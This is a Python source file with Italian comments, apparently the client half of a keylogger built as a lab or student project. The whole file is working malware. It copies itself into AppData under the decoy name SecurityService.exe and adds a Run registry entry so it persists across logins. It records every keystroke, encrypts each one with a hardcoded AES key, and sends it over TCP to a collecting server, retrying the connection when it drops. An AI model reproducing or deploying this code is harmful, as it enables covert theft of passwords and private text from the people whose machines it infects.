# Client Program
import socket # Libreria per la creazione e gestione di socket
from pynput.keyboard import Listener #Libreria per leggere i caratteri digitati sulla tastiera
import time # Libreria contenente funzioni legate al tempo
from Crypto.Cipher import AES # Algoritmo di crittografia a chiave simmetrica

import sys
import shutil
import winreg, getpass

#target_path = "A:\\Desktop\\WindowsDriver.exe"
user = getpass.getuser()
target_path = "C:\\Users\\" + user + "\\AppData\\Local\\Microsoft\\Windows\\Safety\\SecurityService.exe"
try:
    shutil.copyfile(sys.argv[0], target_path)
except shutil.SameFileError:
   pass

reghive = winreg.HKEY_CURRENT_USER
regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

reg = winreg.ConnectRegistry(None, reghive)
key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "SecurityService", 0, winreg.REG_SZ, target_path)


def encryptData(textToEncrypt: str):
    aes = AES.new(b'Fm!t%68Hava!wq&)', AES.MODE_CFB, b'Fh78&rsV2!894R6$')
    encryptedText = aes.encrypt(textToEncrypt.encode())
    return encryptedText


connected = False 
while not connected:
    # Crea il socket "stream based" basato sul protocollo TCP ed indirizzi IPv4
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
    # Connetto il client al server
    print("> Connessione... ")  

    try:  
        clientSocket.connect(("10.0.2.2",9090))
        #clientSocket.connect(("127.0.0.1",9090))
        connected = True  
        print( "> Connessione eseguita" )

        # Funzione che si occupa di inviare il carattere digitato.
        def on_press(key):
            print("  |> Invio (%s > %s)" % (str(key), encryptData(str(key))))
            clientSocket.send(encryptData(str(key)))

        # Creo un'istanza di un listener che registra tutte le pressioni dei tasti.
        # Il costruttore prende la funzione creata e usa il metodo join per joinare l'istanza nel thread principale.
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()

        except socket.error:
            print( "  >> Connessione persa" ) 
            connected = False

    except socket.error:  
        print("  >> Connessione fallita")
        time.sleep(15)